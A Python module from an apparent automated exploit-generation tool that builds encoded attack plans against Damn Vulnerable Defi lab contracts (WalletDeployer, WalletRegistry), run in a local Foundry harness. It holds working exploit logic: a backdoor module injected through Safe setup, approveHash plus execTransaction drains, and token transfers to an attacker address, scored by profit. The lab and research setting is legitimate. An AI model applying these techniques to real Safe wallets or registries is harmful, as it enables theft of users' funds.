"""Plan synthesis for AutoPoC execution"""
from __future__ import annotations

from dataclasses import dataclass, field
from functools import lru_cache
from typing import List, Dict, Any, Tuple, Optional
import json
import os
import shlex
import subprocess

from hexbytes import HexBytes
from eth_abi import encode as abi_encode
from eth_utils import keccak

from config import config

@dataclass
class Binding:
    offset: int
    var: str

@dataclass
class CapTopic:
    event_sig: bytes
    topic_index: int
    var: str

@dataclass
class CapRet:
    start: int
    var: str

@dataclass
class Step:
    op: int
    to: str = "0x0000000000000000000000000000000000000000"
    actor: str = "0x0000000000000000000000000000000000000000"
    value: int = 0
    data: bytes = b""
    expect_revert: bool = False
    binds: List[Binding] = field(default_factory=list)
    cap_topics: List[CapTopic] = field(default_factory=list)
    cap_ret: List[CapRet] = field(default_factory=list)

@dataclass
class Plan:
    steps: List[Step] = field(default_factory=list)
    watch_erc20: List[str] = field(default_factory=list)
    watch_eth: bool = False

def _addr(a: str) -> bytes:
    return HexBytes(a)

def _b32(raw: bytes) -> bytes:
    return raw.rjust(32, b"\x00")


def encode_plan(plan: Plan) -> bytes:
    def _enc_var(v) -> bytes:
        return v if isinstance(v, (bytes, bytearray)) else v.encode() if not v.startswith("0x") else HexBytes(v)

    steps_payload = [
        (
            s.op, _addr(s.to), _addr(s.actor), s.value, s.data, s.expect_revert,
            [(b.offset, _b32(_enc_var(b.var))) for b in s.binds],
            [(t.event_sig, t.topic_index, _b32(_enc_var(t.var))) for t in s.cap_topics],
            [(r.start, _b32(_enc_var(r.var))) for r in s.cap_ret],
        )
        for s in plan.steps
    ]
    plan_tuple = (steps_payload, [_addr(a) for a in plan.watch_erc20], plan.watch_eth)
    types = ["((uint8,address,address,uint256,bytes,bool,(uint16,bytes32)[],(bytes32,uint8,bytes32)[],(uint16,bytes32)[])[],address[],bool)"]
    return abi_encode(types, [plan_tuple])

OP = {
    "NOP": 0, "PRANK_START": 1, "PRANK_STOP": 2, "DEAL_ETH": 3, "WARP": 4, "ROLL": 5,
    "CALL": 6, "STATICCALL": 7, "CREATE": 8, "CREATE2": 9, "EXPECT_REVERT_PUSH": 10,
    "EXPECT_REVERT_POP": 11, "TAG_IMPACT": 12, "CALL_REG": 13, "STATICCALL_REG": 14,
    "WATCH_TOKEN_REG": 15,
}

def sel(sig: str) -> bytes:
    return keccak(text=sig)[:4]

ZERO_ADDRESS = "0x0000000000000000000000000000000000000000"
PLACEHOLDER_AIM = "0x" + "aa" * 20
PLACEHOLDER_OWNER = "0x" + "bb" * 20
PLACEHOLDER_FACTORY = "0x" + "fa" * 20
PLACEHOLDER_SINGLETON = "0x" + "cc" * 20
PLACEHOLDER_SALT = bytes.fromhex("dd" * 32)
PLACEHOLDER_CODEHASH = bytes.fromhex("ee" * 32)
PLACEHOLDER_DEAL_TARGET = "0x" + "ff" * 20
PLACEHOLDER_TOKEN_ADDR = "0x" + "d1" * 20
PLACEHOLDER_RECIPIENT = "0x" + "d2" * 20
PLACEHOLDER_TOPIC_WORD = bytes.fromhex("ab" * 32)
PLACEHOLDER_NONCE_WORD = bytes.fromhex("bc" * 32)
PLACEHOLDER_MODULE_ADDR = "0x" + "db" * 20
PLACEHOLDER_FALLBACK_ADDR = "0x" + "f3" * 20
PLACEHOLDER_PREDICT_ADDR = "0x" + "f4" * 20
PROXY_EVENT_SIG = keccak(text="ProxyCreation(address,address)")
SAFE_PAYOUT_AMOUNT = 10 ** 18
SAFE_PAYOUT_SCHEDULE = [
    SAFE_PAYOUT_AMOUNT,
    SAFE_PAYOUT_AMOUNT // 2,
    SAFE_PAYOUT_AMOUNT // 4,
    max(10 ** 17, SAFE_PAYOUT_AMOUNT // 10),
]
ERC721_TOKEN_ID_PLACEHOLDER = bytes.fromhex("ce" * 32)
PLACEHOLDER_SAFE_ADDR = "0x" + "ac" * 20
PLACEHOLDER_EXEC_TO = "0x" + "ec" * 20
ERC721_PAYOUT_AMOUNT = 1
ERC1155_PAYOUT_AMOUNT = 5
ERC1155_TOKEN_ID = 1
IMPACT_GATE_PREFIXES = (
    "AUTHZ_BYPASS",
    "CONFIG_CAPTURE",
    "FUNDS_FROZEN",
    "LIVENESS_HALT",
    "INVARIANT_BREAK",
    "MARKET_CORRUPTION",
    "VALUE_EXTRACTED",
)
WALLET_REGISTRY_BENEFICIARIES = [
    "0xbabebabe00000000000000000000000000000001",
    "0xbabebabe00000000000000000000000000000002",
    "0xbabebabe00000000000000000000000000000003",
]
REGISTRY_PAYOUT = 10 * 10**18


def _should_selftest() -> bool:
    return os.getenv("AUTOPOC_SELFTEST", "1").strip().lower() not in {"0", "false", "no"}

def _forge_cmd() -> List[str]:
    custom = os.getenv("AUTOPOC_FORGE_CMD")
    return shlex.split(custom) if custom else ["forge", "test", "--match-test", "test_RunAutoPlan", "-vv"]

def _parse_profit(stdout: str) -> int:
    for line in stdout.splitlines():
        if line.strip().startswith("profit:"):
            try:
                return int(line.split("profit:", 1)[1].strip())
            except Exception:
                pass
    return 0

def _parse_tags(stdout: str) -> List[str]:
    return [line.split("IMPACT:", 1)[1].strip() for line in stdout.splitlines()
            if line.strip().startswith("IMPACT:") and line.split("IMPACT:", 1)[1].strip()]

def _impact_pass(meta: Dict[str, Any]) -> bool:
    if meta.get("profit", 0) > 0:
        return True
    return any(tag.startswith(prefix) for tag in (meta.get("impact_tags") or [])
               for prefix in IMPACT_GATE_PREFIXES)

def _score_meta(meta: Dict[str, Any]) -> float:
    return float(meta.get("profit") or 0) + 0.2 * len(meta.get("impact_tags") or []) - (0.5 if not meta.get("success") else 0.0)


def _evaluate_plan(plan: Plan, timeout: int = 180) -> Dict[str, Any]:
    encoded = encode_plan(plan)
    env = os.environ.copy()
    env["AUTOPOC_PLAN"] = "0x" + encoded.hex()
    cmd = _forge_cmd()
    try:
        proc = subprocess.run(
            cmd,
            cwd=config.PROJECT_ROOT,
            capture_output=True,
            text=True,
            timeout=timeout,
            env=env,
        )
        stdout = proc.stdout or ""
        stderr = proc.stderr or ""
        profit = _parse_profit(stdout)
        tags = _parse_tags(stdout)
        return {
            "success": proc.returncode == 0,
            "profit": profit,
            "impact_tags": tags,
            "stdout": stdout,
            "stderr": stderr,
            "exit_code": proc.returncode,
        }
    except subprocess.TimeoutExpired as exc:
        return {
            "success": False,
            "profit": 0,
            "impact_tags": [],
            "stdout": exc.stdout or "",
            "stderr": exc.stderr or f"AutoPoC forge timeout ({timeout}s)",
            "exit_code": -1,
        }


def _var_to_bytes(var: str) -> bytes:
    return (var.encode() if not var.startswith("0x") else bytes.fromhex(var[2:])).rjust(32, b"\x00")

def op_prank(addr: str) -> Step:
    return Step(op=OP["PRANK_START"], actor=addr)

def op_prank_stop() -> Step:
    return Step(op=OP["PRANK_STOP"])

def op_tag(tag: str) -> Step:
    return Step(op=OP["TAG_IMPACT"], data=tag.encode())

def op_watch_token(var: str) -> Step:
    return Step(op=OP["WATCH_TOKEN_REG"], data=_var_to_bytes(var))

def op_call_reg(var: str, data: bytes, value: int = 0, binds=None, cap_topics=None, cap_ret=None, expect=False) -> Step:
    return Step(op=OP["CALL_REG"], data=_var_to_bytes(var) + data, value=value,
                binds=binds or [], cap_topics=cap_topics or [], cap_ret=cap_ret or [], expect_revert=expect)

def op_staticcall_reg(var: str, data: bytes, binds=None, cap_ret=None) -> Step:
    return Step(op=OP["STATICCALL_REG"], data=_var_to_bytes(var) + data, binds=binds or [], cap_ret=cap_ret or [])


def _placeholder_bytes(value) -> bytes:
    return bytes(value) if isinstance(value, (bytes, bytearray)) else bytes.fromhex(value[2:].rjust(64, "0"))

def _find_offset(blob: bytes, needle: bytes) -> int:
    idx = blob.find(needle)
    if idx < 0:
        raise ValueError("placeholder not found in payload")
    return idx


def _build_safe_initializer() -> Tuple[bytes, int]:
    payload = sel("setup(address[],uint256,address,bytes,address,address,uint256,address)") + abi_encode(
        ["address[]", "uint256", "address", "bytes", "address", "address", "uint256", "address"],
        [[PLACEHOLDER_OWNER], 1, ZERO_ADDRESS, b"", ZERO_ADDRESS, ZERO_ADDRESS, 0, ZERO_ADDRESS])
    return payload, _find_offset(payload, _placeholder_bytes(PLACEHOLDER_OWNER))

def _build_compute_salt_call(initializer: bytes, nonce: int) -> Tuple[bytes, Optional[int]]:
    payload = sel("computeSalt(bytes,uint256)") + abi_encode(["bytes", "uint256"], [initializer, nonce])
    try:
        return payload, _find_offset(payload, _placeholder_bytes(PLACEHOLDER_OWNER))
    except ValueError:
        return payload, None

def _build_code_hash_call() -> Tuple[bytes, List[Binding]]:
    payload = sel("computeCodeHash(address,address)") + abi_encode(["address", "address"], [PLACEHOLDER_FACTORY, PLACEHOLDER_SINGLETON])
    return payload, [
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_FACTORY)), var="FACTORY"),
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_SINGLETON)), var="SINGLETON")]

def _build_predict_call() -> Tuple[bytes, List[Binding]]:
    payload = sel("predict(address,bytes32,bytes32)") + abi_encode(["address", "bytes32", "bytes32"],
                                                                      [PLACEHOLDER_FACTORY, PLACEHOLDER_SALT, PLACEHOLDER_CODEHASH])
    return payload, [
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_FACTORY)), var="FACTORY"),
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_SALT)), var="SALT"),
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_CODEHASH)), var="CODEHASH")]

def _build_drop_call(initializer: bytes, nonce: int) -> Tuple[bytes, List[Binding]]:
    payload = sel("drop(address,bytes,uint256)") + abi_encode(["address", "bytes", "uint256"], [PLACEHOLDER_AIM, initializer, nonce])
    binds = [Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_AIM)), var="SAFE")]
    try:
        binds.append(Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_OWNER)), var="ATTACKER"))
    except ValueError:
        pass
    return payload, binds


def _build_probe_codehash_call(initializer: bytes, salt_start: int, attempts: int) -> Tuple[bytes, List[Binding]]:
    payload = sel("probeCodehash(address,bytes,address,uint256,uint256)") + abi_encode(
        ["address", "bytes", "address", "uint256", "uint256"],
        [PLACEHOLDER_FACTORY, initializer, PLACEHOLDER_SINGLETON, salt_start, attempts])
    binds = [
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_FACTORY)), var="FACTORY"),
        Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_SINGLETON)), var="SINGLETON")]
    try:
        binds.append(Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_OWNER)), var="ATTACKER"))
    except ValueError:
        pass
    return payload, binds

def _build_transfer_call(amount: int) -> Tuple[bytes, List[Binding]]:
    payload = sel("transfer(address,uint256)") + abi_encode(["address", "uint256"], [PLACEHOLDER_DEAL_TARGET, amount])
    return payload, [Binding(offset=_find_offset(payload, _placeholder_bytes(PLACEHOLDER_DEAL_TARGET)), var="DEPLOYER")]


def _prevalidated_signature(attacker: str) -> bytes:
    return bytes.fromhex(attacker[2:].rjust(64, "0")) + (b"\x00" * 32) + b"\x01"


def _make_bindings(payload: bytes, placeholders: List[Tuple[bytes, str]]) -> List[Binding]:
    return [Binding(offset=_find_offset(payload, ph), var=var) for ph, var in placeholders]

def _build_safe_call_steps(target_var: str, call_data: bytes, call_placeholders: List[Tuple[bytes, str]],
                            attacker: str, value: int = 0) -> List[Step]:
    steps = [op_staticcall_reg("SAFE", sel("nonce()"), cap_ret=[CapRet(start=0, var="SAFE_NONCE")])]

    nonce_int = int.from_bytes(PLACEHOLDER_NONCE_WORD, "big")
    gth_payload = sel("getTransactionHash(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,uint256)") + abi_encode(
        ["address", "uint256", "bytes", "uint8", "uint256", "uint256", "uint256", "address", "address", "uint256"],
        [PLACEHOLDER_EXEC_TO, value, call_data, 0, 0, 0, 0, ZERO_ADDRESS, ZERO_ADDRESS, nonce_int])
    gth_placeholders = [(_placeholder_bytes(PLACEHOLDER_EXEC_TO), target_var), (PLACEHOLDER_NONCE_WORD, "SAFE_NONCE")] + call_placeholders
    steps.append(op_staticcall_reg("SAFE", gth_payload, binds=_make_bindings(gth_payload, gth_placeholders),
                                    cap_ret=[CapRet(start=0, var="SAFE_TXHASH")]))

    steps.extend([op_prank(attacker),
                  op_call_reg("SAFE", sel("approveHash(bytes32)") + (b"\x00" * 32), binds=[Binding(offset=4, var="SAFE_TXHASH")])])

    exec_payload = sel("execTransaction(address,uint256,bytes,uint8,uint256,uint256,uint256,address,address,bytes)") + abi_encode(
        ["address", "uint256", "bytes", "uint8", "uint256", "uint256", "uint256", "address", "address", "bytes"],
        [PLACEHOLDER_EXEC_TO, value, call_data, 0, 0, 0, 0, ZERO_ADDRESS, ZERO_ADDRESS, _prevalidated_signature(attacker)])
    exec_placeholders = [(_placeholder_bytes(PLACEHOLDER_EXEC_TO), target_var)] + call_placeholders
    steps.extend([op_call_reg("SAFE", exec_payload, binds=_make_bindings(exec_payload, exec_placeholders)), op_prank_stop()])
    return steps


def _safe_erc20_payout_steps(amount: int, attacker: str) -> List[Step]:
    inner = sel("transfer(address,uint256)") + abi_encode(["address", "uint256"], [PLACEHOLDER_RECIPIENT, amount])
    return _build_safe_call_steps("TOKEN", inner, [(_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER")], attacker)


def _erc721_transfer_steps(attacker: str) -> List[Step]:
    mint_payload = sel("mint(address)") + _placeholder_bytes(PLACEHOLDER_SAFE_ADDR)
    steps = [op_call_reg("NFT_TOKEN", mint_payload, binds=_make_bindings(mint_payload, [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE")]),
                         cap_ret=[CapRet(start=0, var="NFT_ID")])]
    transfer_payload = sel("safeTransferFrom(address,address,uint256)") + abi_encode(
        ["address", "address", "uint256"], [PLACEHOLDER_SAFE_ADDR, PLACEHOLDER_RECIPIENT, int.from_bytes(ERC721_TOKEN_ID_PLACEHOLDER, "big")])
    placeholders = [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER"),
                    (ERC721_TOKEN_ID_PLACEHOLDER, "NFT_ID")]
    return steps + _build_safe_call_steps("NFT_TOKEN", transfer_payload, placeholders, attacker)

def _erc1155_transfer_steps(attacker: str) -> List[Step]:
    mint_payload = sel("mint(address,uint256,uint256)") + abi_encode(
        ["address", "uint256", "uint256"], [PLACEHOLDER_SAFE_ADDR, ERC1155_TOKEN_ID, ERC1155_PAYOUT_AMOUNT])
    steps = [op_call_reg("ERC1155_TOKEN", mint_payload, binds=_make_bindings(mint_payload, [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE")]))]
    transfer_payload = sel("safeTransferFrom(address,address,uint256,uint256,bytes)") + abi_encode(
        ["address", "address", "uint256", "uint256", "bytes"],
        [PLACEHOLDER_SAFE_ADDR, PLACEHOLDER_RECIPIENT, ERC1155_TOKEN_ID, ERC1155_PAYOUT_AMOUNT, b""])
    placeholders = [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER")]
    return steps + _build_safe_call_steps("ERC1155_TOKEN", transfer_payload, placeholders, attacker)


def _permit_payout_steps(amount: int, attacker: str) -> List[Step]:
    mint_payload = sel("mint(address,uint256)") + abi_encode(["address", "uint256"], [PLACEHOLDER_SAFE_ADDR, amount])
    force_payload = sel("forceApprove(address,address,uint256)") + abi_encode(
        ["address", "address", "uint256"], [PLACEHOLDER_SAFE_ADDR, PLACEHOLDER_RECIPIENT, amount])
    transfer_payload = sel("transferFrom(address,address,uint256)") + abi_encode(
        ["address", "address", "uint256"], [PLACEHOLDER_SAFE_ADDR, PLACEHOLDER_RECIPIENT, amount])

    return [
        op_call_reg("PERMIT_TOKEN", mint_payload, binds=_make_bindings(mint_payload, [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE")])),
        op_call_reg("PERMIT_TOKEN", force_payload, binds=_make_bindings(force_payload, [
            (_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER")])),
        op_prank(attacker),
        op_call_reg("PERMIT_TOKEN", transfer_payload, binds=_make_bindings(transfer_payload, [
            (_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER")])),
        op_prank_stop()
    ]


def _wallet_registry_backdoor_steps(beneficiary: str, salt_nonce: int, attacker: str) -> List[Step]:
    backdoor_payload = sel("init(address,address)") + abi_encode(["address", "address"], [PLACEHOLDER_TOKEN_ADDR, PLACEHOLDER_RECIPIENT])
    setup_payload = sel("setup(address[],uint256,address,bytes,address,address,uint256,address)") + abi_encode(
        ["address[]", "uint256", "address", "bytes", "address", "address", "uint256", "address"],
        [[beneficiary], 1, PLACEHOLDER_MODULE_ADDR, backdoor_payload, ZERO_ADDRESS, ZERO_ADDRESS, 0, ZERO_ADDRESS])
    drop_payload = sel("createProxyWithCallback(address,bytes,uint256,address)") + abi_encode(
        ["address", "bytes", "uint256", "address"], [PLACEHOLDER_SINGLETON, setup_payload, salt_nonce, PLACEHOLDER_FALLBACK_ADDR])

    transfer_payload = sel("transferFrom(address,address,uint256)") + abi_encode(
        ["address", "address", "uint256"], [PLACEHOLDER_AIM, PLACEHOLDER_RECIPIENT, REGISTRY_PAYOUT])

    return [
        op_call_reg("FACTORY", drop_payload, binds=_make_bindings(drop_payload, [
            (_placeholder_bytes(PLACEHOLDER_SINGLETON), "SINGLETON"), (_placeholder_bytes(PLACEHOLDER_MODULE_ADDR), "BACKDOOR_MODULE"),
            (_placeholder_bytes(PLACEHOLDER_TOKEN_ADDR), "TOKEN"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER"),
            (_placeholder_bytes(PLACEHOLDER_FALLBACK_ADDR), "REGISTRY")]),
            cap_topics=[CapTopic(event_sig=PROXY_EVENT_SIG, topic_index=1, var="SAFE")]),
        op_call_reg("TOKEN", transfer_payload, binds=_make_bindings(transfer_payload, [
            (_placeholder_bytes(PLACEHOLDER_AIM), "SAFE"), (_placeholder_bytes(PLACEHOLDER_RECIPIENT), "ATTACKER")]))
    ]


def detect_safe_version(bytecode: bytes) -> str:
    hexcode = bytecode.hex()
    return "1.4" if any(sig in hexcode for sig in ("da9bedd6", "31814e6a", "5c52c2f5", "a0e67e2b")) else "1.3"

def extract_push4_selectors(bytecode: bytes, limit: int = 16) -> List[bytes]:
    data, selectors, i, seen = bytearray(bytecode), [], 0, set()
    while i < len(data) - 5 and len(selectors) < limit:
        op = data[i]
        if op == 0x63:
            sel_bytes = bytes(data[i + 1 : i + 5])
            if sel_bytes not in seen and sel_bytes != b"\x00\x00\x00\x00":
                seen.add(sel_bytes)
                selectors.append(sel_bytes)
            i += 5
        else:
            i += 1 + (op - 0x5f if 0x60 <= op <= 0x7f else 0)
    return selectors

ARTIFACT_ROOTS = [config.PROJECT_ROOT / "training" / "damn-vulnerable-defi" / "out", config.PROJECT_ROOT / "out"]

@lru_cache(maxsize=None)
def load_creation_bytecode(sol_file: str, contract: str) -> bytes:
    for root in ARTIFACT_ROOTS:
        path = root / sol_file / f"{contract}.json"
        if path.exists():
            with path.open("r", encoding="utf-8") as fh:
                bytecode = json.load(fh).get("bytecode", {}).get("object", "")
            return bytes.fromhex(bytecode[2:] if bytecode.startswith("0x") else bytecode)
    raise FileNotFoundError(f"Artifact for {contract} ({sol_file}) not found")

def is_wallet_deployer(contract_info: Dict[str, Any]) -> bool:
    name, path = str(contract_info.get("name", "")), str(contract_info.get("file_path", "") or contract_info.get("path", ""))
    return "WalletDeployer" in name or "wallet-mining/WalletDeployer.sol" in path

def is_wallet_registry(contract_info: Dict[str, Any]) -> bool:
    name, path = str(contract_info.get("name", "")), str(contract_info.get("file_path", "") or contract_info.get("path", ""))
    return "WalletRegistry" in name or "backdoor/WalletRegistry.sol" in path


def _create_contract(sol_file: str, contract: str, var: str) -> Step:
    return Step(op=OP["CREATE"], data=load_creation_bytecode(sol_file, contract), cap_ret=[CapRet(start=0, var=var)])

def _build_wallet_deployer_plan(attacker: str, payout_amount: int) -> Plan:
    plan = Plan(watch_eth=True, watch_erc20=[])

    plan.steps.extend([
        _create_contract("PlanFixtures.sol", "PlanSafeHelper", "HELPER"),
        op_prank(attacker),
        op_call_reg("HELPER", sel("identify()"), cap_ret=[CapRet(start=0, var="ATTACKER")]),
        op_prank_stop(),
        _create_contract("PlanFixtures.sol", "PlanProber", "PROBER"),
        _create_contract("PlanFixtures.sol", "PlanToken", "TOKEN"),
        op_watch_token("TOKEN"),
        _create_contract("PlanFixtures.sol", "PlanPermitToken", "PERMIT_TOKEN"),
        op_watch_token("PERMIT_TOKEN"),
        _create_contract("PlanFixtures.sol", "PlanERC721", "NFT_TOKEN"),
        op_watch_token("NFT_TOKEN"),
        _create_contract("PlanFixtures.sol", "PlanERC1155", "ERC1155_TOKEN"),
        op_watch_token("ERC1155_TOKEN"),
        _create_contract("SafeProxyFactory.sol", "SafeProxyFactory", "FACTORY"),
    ])

    singleton_code = load_creation_bytecode("Safe.sol", "Safe")
    plan.steps.append(_create_contract("Safe.sol", "Safe", "SINGLETON"))
    safe_version = detect_safe_version(singleton_code)

    plan.steps.append(_create_contract("PlanWalletFactory.sol", "PlanWalletFactory", "WALLET_HELPER"))

    deploy_payload = sel("deploy(address,address,address,address)") + abi_encode(
        ["address", "address", "address", "address"],
        [PLACEHOLDER_DEAL_TARGET, PLACEHOLDER_FACTORY, PLACEHOLDER_SINGLETON, PLACEHOLDER_OWNER])
    plan.steps.append(op_call_reg("WALLET_HELPER", deploy_payload, binds=_make_bindings(deploy_payload, [
        (_placeholder_bytes(PLACEHOLDER_DEAL_TARGET), "TOKEN"), (_placeholder_bytes(PLACEHOLDER_FACTORY), "FACTORY"),
        (_placeholder_bytes(PLACEHOLDER_SINGLETON), "SINGLETON"), (_placeholder_bytes(PLACEHOLDER_OWNER), "ATTACKER")]),
        cap_ret=[CapRet(start=0, var="DEPLOYER")]))

    reward_mint_payload = sel("mint(address,uint256)") + abi_encode(["address", "uint256"], [PLACEHOLDER_DEAL_TARGET, max(payout_amount * 5, payout_amount)])
    plan.steps.append(op_call_reg("TOKEN", reward_mint_payload, binds=_make_bindings(reward_mint_payload, [(_placeholder_bytes(PLACEHOLDER_DEAL_TARGET), "DEPLOYER")])))

    initializer, _ = _build_safe_initializer()
    salt_nonce = 1337

    compute_salt_payload, salt_owner_offset = _build_compute_salt_call(initializer, salt_nonce)
    plan.steps.append(op_call_reg("HELPER", compute_salt_payload,
                                   binds=[Binding(offset=salt_owner_offset, var="ATTACKER")] if salt_owner_offset else [],
                                   cap_ret=[CapRet(start=0, var="SALT")]))

    code_hash_payload, code_hash_binds = _build_code_hash_call()
    plan.steps.append(op_call_reg("HELPER", code_hash_payload, binds=code_hash_binds, cap_ret=[CapRet(start=0, var="CODEHASH")]))

    predict_payload, predict_binds = _build_predict_call()
    plan.steps.append(op_call_reg("HELPER", predict_payload, binds=predict_binds,
                                   cap_ret=[CapRet(start=0, var="SAFE_PREDICTED"), CapRet(start=0, var="SAFE")]))

    probe_payload, probe_binds = _build_probe_codehash_call(initializer, salt_nonce, attempts=8)
    plan.steps.append(op_call_reg("HELPER", probe_payload, binds=probe_binds, cap_ret=[CapRet(start=0, var="SAFE_PROBE")]))

    for idx, selector in enumerate(extract_push4_selectors(load_creation_bytecode("WalletDeployer.sol", "WalletDeployer"))[:6]):
        probe_payload = sel("probe(address,bytes)") + abi_encode(["address", "bytes"], [PLACEHOLDER_FACTORY, selector])
        plan.steps.append(op_call_reg("PROBER", probe_payload, binds=_make_bindings(probe_payload, [(_placeholder_bytes(PLACEHOLDER_FACTORY), "DEPLOYER")]),
                                       cap_ret=[CapRet(start=32, var=f"PROBE_{idx}")]))

    drop_payload, drop_binds = _build_drop_call(initializer, salt_nonce)
    plan.steps.append(op_call_reg("DEPLOYER", drop_payload, binds=drop_binds,
                                   cap_topics=[CapTopic(event_sig=PROXY_EVENT_SIG, topic_index=1, var="SAFE_EVENT")]))

    coalesce_payload = sel("coalesce(bytes32,address,address)") + abi_encode(
        ["bytes32", "address", "address"], [PLACEHOLDER_TOPIC_WORD, PLACEHOLDER_FALLBACK_ADDR, PLACEHOLDER_PREDICT_ADDR])
    plan.steps.append(op_call_reg("HELPER", coalesce_payload, binds=_make_bindings(coalesce_payload, [
        (_placeholder_bytes(PLACEHOLDER_TOPIC_WORD), "SAFE_EVENT"), (_placeholder_bytes(PLACEHOLDER_FALLBACK_ADDR), "SAFE_PROBE"),
        (_placeholder_bytes(PLACEHOLDER_PREDICT_ADDR), "SAFE_PREDICTED")]), cap_ret=[CapRet(start=0, var="SAFE")]))

    mint_payload = sel("mint(address,uint256)") + abi_encode(["address", "uint256"], [PLACEHOLDER_SAFE_ADDR, payout_amount])
    plan.steps.append(op_call_reg("TOKEN", mint_payload, binds=_make_bindings(mint_payload, [(_placeholder_bytes(PLACEHOLDER_SAFE_ADDR), "SAFE")])))

    plan.steps.extend(_safe_erc20_payout_steps(payout_amount, attacker))
    plan.steps.extend(_erc721_transfer_steps(attacker))
    plan.steps.extend(_erc1155_transfer_steps(attacker))
    plan.steps.extend(_permit_payout_steps(payout_amount, attacker))
    plan.steps.extend([op_tag(f"VALUE_EXTRACTED_SAFE_{safe_version}"), op_tag("AUTHZ_BYPASS")])
    return plan


def synthesize_wallet_deployer_plan(attacker: str, search: bool = True) -> Plan:
    if not search or not _should_selftest():
        return _build_wallet_deployer_plan(attacker, SAFE_PAYOUT_AMOUNT)

    best_plan, best_meta = None, None
    for amount in [amt for amt in SAFE_PAYOUT_SCHEDULE if amt > 0]:
        plan, meta = _build_wallet_deployer_plan(attacker, amount), _evaluate_plan(_build_wallet_deployer_plan(attacker, amount))
        if meta["success"] and _impact_pass(meta):
            return plan
        if best_meta is None or _score_meta(meta) > _score_meta(best_meta):
            best_plan, best_meta = plan, meta
    return best_plan if best_plan else _build_wallet_deployer_plan(attacker, SAFE_PAYOUT_AMOUNT)


def synthesize_wallet_registry_plan(attacker: str) -> Plan:
    plan = Plan(watch_eth=False, watch_erc20=[])

    plan.steps.extend([
        _create_contract("PlanFixtures.sol", "PlanSafeHelper", "HELPER"),
        op_prank(attacker),
        op_call_reg("HELPER", sel("identify()"), cap_ret=[CapRet(start=0, var="ATTACKER")]),
        op_prank_stop(),
        _create_contract("PlanFixtures.sol", "PlanProber", "PROBER"),
        _create_contract("DamnValuableToken.sol", "DamnValuableToken", "TOKEN"),
        op_watch_token("TOKEN"),
        _create_contract("SafeProxyFactory.sol", "SafeProxyFactory", "FACTORY"),
        _create_contract("Safe.sol", "Safe", "SINGLETON"),
    ])

    registry_payload = load_creation_bytecode("WalletRegistry.sol", "WalletRegistry") + abi_encode(
        ["address", "address", "address", "address[]"],
        [PLACEHOLDER_SINGLETON, PLACEHOLDER_FACTORY, PLACEHOLDER_TOKEN_ADDR, WALLET_REGISTRY_BENEFICIARIES])
    plan.steps.append(Step(op=OP["CREATE"], data=registry_payload, binds=_make_bindings(registry_payload, [
        (_placeholder_bytes(PLACEHOLDER_SINGLETON), "SINGLETON"), (_placeholder_bytes(PLACEHOLDER_FACTORY), "FACTORY"),
        (_placeholder_bytes(PLACEHOLDER_TOKEN_ADDR), "TOKEN")]), cap_ret=[CapRet(start=0, var="REGISTRY")]))

    fund_payload = sel("transfer(address,uint256)") + abi_encode(["address", "uint256"],
                                                                   [PLACEHOLDER_FALLBACK_ADDR, len(WALLET_REGISTRY_BENEFICIARIES) * REGISTRY_PAYOUT])
    plan.steps.append(op_call_reg("TOKEN", fund_payload, binds=_make_bindings(fund_payload, [(_placeholder_bytes(PLACEHOLDER_FALLBACK_ADDR), "REGISTRY")])))

    plan.steps.append(_create_contract("PlanFixtures.sol", "BackdoorModule", "BACKDOOR_MODULE"))
    for idx, beneficiary in enumerate(WALLET_REGISTRY_BENEFICIARIES):
        plan.steps.extend(_wallet_registry_backdoor_steps(beneficiary, idx, attacker))

    plan.steps.extend([op_tag("VALUE_EXTRACTED_SAFE_BACKDOOR"), op_tag("AUTHZ_BYPASS")])
    return plan


def synthesize_plan(contract_info: Dict[str, Any], attacker: str) -> Plan:
    if is_wallet_deployer(contract_info):
        return synthesize_wallet_deployer_plan(attacker)
    if is_wallet_registry(contract_info):
        return synthesize_wallet_registry_plan(attacker)
    return Plan(watch_eth=False, watch_erc20=[], steps=[op_tag("CONFIG_CAPTURE")])

def build_and_encode(contract_info: Dict[str, Any], attacker: str) -> bytes:
    return encode_plan(synthesize_plan(contract_info, attacker))
